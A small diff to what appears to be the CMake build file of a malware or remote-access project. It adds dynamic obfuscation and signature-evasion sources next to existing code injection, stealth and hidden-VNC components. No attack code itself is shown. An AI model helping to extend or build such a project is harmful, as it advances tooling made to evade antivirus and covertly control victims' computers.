@@ -50,6 +50,8 @@ set(STEALTH_SOURCES
     src/stealth/code_injection.cpp
     src/stealth/auto_rotation.cpp
     src/stealth/obfuscation.cpp
+    src/stealth/dynamic_obfuscation.cpp
+    src/stealth/signature_evasion.cpp
 )
 
 # HVNC sources
